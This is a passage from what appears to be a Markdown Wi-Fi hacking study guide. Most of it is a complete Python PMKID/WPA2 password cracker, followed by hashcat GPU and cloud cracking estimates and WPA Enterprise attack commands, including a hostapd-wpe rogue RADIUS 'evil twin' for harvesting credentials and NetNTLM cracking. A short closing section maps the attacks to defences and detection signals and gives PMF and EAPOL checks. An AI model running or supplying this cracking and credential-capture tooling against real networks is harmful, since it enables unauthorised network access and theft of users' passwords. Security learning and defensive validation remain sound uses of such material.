# ------------------------------------------------------------------ #
def compute_pmk(password: str, ssid: str) -> bytes:
    """PMK = PBKDF2-HMAC-SHA1(password, ssid, 4096 rounds, 32 bytes)"""
    return hashlib.pbkdf2_hmac(
        "sha1",
        password.encode("utf-8", errors="replace"),
        ssid.encode("utf-8", errors="replace"),
        4096,
        32,
    )


def compute_pmkid(pmk: bytes, ap_mac_hex: str, client_mac_hex: str) -> str:
    """
    PMKID = HMAC-SHA1(PMK, b'PMK Name' || AP_MAC_bytes || Client_MAC_bytes)[:16]
    """
    ap_bytes = bytes.fromhex(ap_mac_hex.replace(":", "").replace("-", ""))
    client_bytes = bytes.fromhex(client_mac_hex.replace(":", "").replace("-", ""))
    data = b"PMK Name" + ap_bytes + client_bytes
    digest = hmac.new(pmk, data, hashlib.sha1).digest()
    return digest[:16].hex()


def compute_mic(pmk: bytes, ap_nonce: bytes, client_nonce: bytes,
                ap_mac: bytes, client_mac: bytes, eapol_data: bytes) -> str:
    """
    Compute MIC after PTK derivation (for 4-Way Handshake verification)
    PTK = PRF-512(PMK, 'Pairwise key expansion' || min/max(macs) || min/max(nonces))
    """
    # PTK derivation (802.11i PRF-512)
    def prf512(key: bytes, a: bytes, b: bytes) -> bytes:
        result = b""
        for i in range(4):
            result += hmac.new(key, a + b"\x00" + b + bytes([i]), hashlib.sha1).digest()
        return result[:64]

    min_mac = min(ap_mac, client_mac)
    max_mac = max(ap_mac, client_mac)
    min_nonce = min(ap_nonce, client_nonce)
    max_nonce = max(ap_nonce, client_nonce)

    ptk = prf512(
        pmk,
        b"Pairwise key expansion",
        min_mac + max_mac + min_nonce + max_nonce,
    )
    kck = ptk[:16]   # Key Confirmation Key
    mic = hmac.new(kck, eapol_data, hashlib.md5).hexdigest()
    return mic


# ------------------------------------------------------------------ #
#  Cracking worker (for multiprocessing)
# ------------------------------------------------------------------ #
def _crack_worker(
    chunk: list[str],
    ssid: str,
    target_pmkid: str,
    ap_mac: str,
    client_mac: str,
    result_queue: multiprocessing.Queue,
) -> None:
    for password in chunk:
        password = password.strip()
        if not password:
            continue
        try:
            pmk = compute_pmk(password, ssid)
            computed = compute_pmkid(pmk, ap_mac, client_mac)
            if computed == target_pmkid.lower():
                result_queue.put(("found", password))
                return
        except Exception:
            continue
    result_queue.put(("done", None))


# ------------------------------------------------------------------ #
#  Main cracker class
# ------------------------------------------------------------------ #
@dataclass
class PMKIDCracker:
    ssid: str
    target_pmkid: str
    ap_mac: str
    client_mac: str
    wordlist: str
    workers: int = multiprocessing.cpu_count()

    def crack(self) -> Optional[str]:
        wl_path = Path(self.wordlist)
        if not wl_path.exists():
            print(f"[-] Wordlist not found: {wl_path}", file=sys.stderr)
            return None

        # Load entire wordlist (chunk processing for large files)
        print(f"[*] Loading wordlist: {wl_path}", file=sys.stderr)
        try:
            with open(wl_path, encoding="latin-1", errors="replace") as fh:
                words = fh.readlines()
        except OSError as exc:
            print(f"[-] File read failed: {exc}", file=sys.stderr)
            return None

        total = len(words)
        print(f"[*] {total:,} words | Processes: {self.workers}", file=sys.stderr)
        print(f"[*] Target PMKID: {self.target_pmkid}", file=sys.stderr)
        print(f"[*] SSID: {self.ssid}  AP: {self.ap_mac}  Client: {self.client_mac}", file=sys.stderr)

        chunk_size = max(1, total // self.workers)
        chunks = [words[i : i + chunk_size] for i in range(0, total, chunk_size)]

        result_queue: multiprocessing.Queue = multiprocessing.Queue()
        processes = []
        for chunk in chunks:
            p = multiprocessing.Process(
                target=_crack_worker,
                args=(chunk, self.ssid, self.target_pmkid, self.ap_mac, self.client_mac, result_queue),
            )
            p.start()
            processes.append(p)

        start = time.time()
        found_pw: Optional[str] = None
        done_count = 0

        while done_count < len(processes):
            msg_type, value = result_queue.get()
            if msg_type == "found":
                found_pw = value
                for p in processes:
                    p.terminate()
                break
            else:
                done_count += 1

        for p in processes:
            p.join()

        elapsed = time.time() - start

        if found_pw:
            rate = total / elapsed if elapsed > 0 else 0
            print(f"\n[+] Password found: {found_pw}")
            print(f"[+] Elapsed: {elapsed:.1f}s  Speed: {rate:,.0f} PMK/s")
        else:
            print(f"\n[-] Password not found. ({elapsed:.1f}s / {total:,} attempts)")

        return found_pw


# ------------------------------------------------------------------ #
#  CLI
# ------------------------------------------------------------------ #
def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="PMKID/WPA2 handshake offline cracking tool (for educational/CTF purposes)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Examples:\n"
               "  python3 pmkid_crack.py \\\n"
               "    --ssid MyWiFi \\\n"
               "    --pmkid d6fd3e50a1234567890abcdef1234567 \\\n"
               "    --ap-mac AA:BB:CC:DD:EE:FF \\\n"
               "    --client-mac 11:22:33:44:55:66 \\\n"
               "    --wordlist /usr/share/wordlists/rockyou.txt",
    )
    parser.add_argument("--ssid",       required=True, help="Target SSID")
    parser.add_argument("--pmkid",      required=True, help="Collected PMKID (32-char hex)")
    parser.add_argument("--ap-mac",     required=True, help="AP BSSID (AA:BB:CC:DD:EE:FF)")
    parser.add_argument("--client-mac", required=True, help="Client MAC address")
    parser.add_argument("--wordlist",   required=True, metavar="FILE", help="Wordlist file")
    parser.add_argument(
        "--workers", type=int, default=multiprocessing.cpu_count(),
        help=f"Number of parallel processes (default: {multiprocessing.cpu_count()})",
    )
    return parser


def main() -> None:
    parser = build_parser()
    args = parser.parse_args()

    if len(args.pmkid) != 32:
        parser.error("PMKID must be a 32-character hex string")

    cracker = PMKIDCracker(
        ssid=args.ssid,
        target_pmkid=args.pmkid,
        ap_mac=args.ap_mac,
        client_mac=args.client_mac,
        wordlist=args.wordlist,
        workers=args.workers,
    )
    cracker.crack()


if __name__ == "__main__":
    main()
```

---

## 7. Performance Benchmarks

Measure GPU performance with hashcat benchmarks. Check hashes per second (H/s) in WPA2 mode to estimate cracking time.

```bash
# hashcat performance test
hashcat -b -m 22000

# Typical performance (by GPU)
# GTX 1080 Ti: ~500,000 H/s
# RTX 3090:    ~750,000 H/s
# RTX 4090:    ~1,100,000 H/s

# Estimated cracking time for rockyou.txt (14M)
# RTX 3090: ~19 seconds (dictionary)
# All 8-digit numbers: 100,000,000 / 750,000 = ~133 seconds

# Cloud cracking (AWS)
# p3.2xlarge (V100): ~400,000 H/s
# Cost: approximately $3/hour

# Distributed cracking (Hashtopolis)
# Link multiple GPU servers
# docker run hashtopolis/hashtopolis
```

---

## 8. WPA Enterprise (802.1X) Attacks

Capture PEAP/MSCHAPv2 credentials in WPA Enterprise (802.1X) environments. Run a rogue RADIUS server with hostapd-wpe to intercept credentials.

```bash
# Capture and crack PEAP/MSCHAPv2
# Collect EAP authentication packets
sudo airodump-ng wlan0mon --write enterprise_capture

# Crack MSCHAPv2 with asleap
asleap -r enterprise_capture-01.cap \
       -W wordlist.txt

# hostapd-wpe (WPA Enterprise Evil Twin)
# Rogue RADIUS server for credential collection
sudo apt install hostapd-wpe
# After configuring /etc/hostapd-wpe/hostapd-wpe.conf:
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# Crack captured MSCHAPv2 challenge/response
hashcat -m 5500 netntlm.txt wordlist.txt  # NTLMv1
hashcat -m 5600 netntlmv2.txt wordlist.txt  # NTLMv2
```

<!-- detect-validate-15 -->
## Attack Detection and Defense Validation

WPA2-PSK cracking is an *offline attack* — the attacker only needs to capture the 4-way handshake (or PMKID), then leaves and cracks it with a wordlist/GPU. So defenders must detect and block not the **crack itself** but the **handshake-capture attempts (especially deauth-induced) and weak PSKs**. Practice only on **owned/authorized networks**.

### Attack -> Mitigation layer -> Control (defender) -> Detection signal

| Technique | Weakness targeted | Primary control (prevent) | Detection signal |
|---|---|---|---|
| 4-way handshake capture | Weak PSK | Long random PSK, WPA3-SAE | Spike in EAPOL retransmissions |
| Forced reauth via deauth | Unprotected mgmt frames | 802.11w (PMF) | Bursts of deauth/disassoc |
| Clientless PMKID | RSN PMKID exposure | Disable PMKID, WPA3 | PMKID requests with no association |
| Wordlist/GPU crack | PSK present in wordlist | Passphrase policy | (offline — prevention is the only control) |

### Defense validation (do it yourself)

```bash
# 1) Verify deauth is blocked by PMF — owned AP / controlled RF only
grep -E '^ieee80211w' /etc/hostapd/hostapd.conf || echo 'PMF not set — vulnerable to forced handshake capture'
# 2) Monitor EAPOL retransmissions / deauth floods (detect capture attempts in a capture)
tshark -r cap.pcap -Y 'eapol || wlan.fc.type_subtype==0x0c' | wc -l
```

> Because WPA2 cracking is offline after capture, *prevention (strong PSK, WPA3-SAE)* is the essence, while detection focuses on *capture attempts (deauth/EAPOL floods, PMKID requests)* — "we enabled WPA2" is not the same as "a handshake cannot be force-captured (PMF)" ([[13_SOC_Blue_Team]], [[16_Cryptography]]).
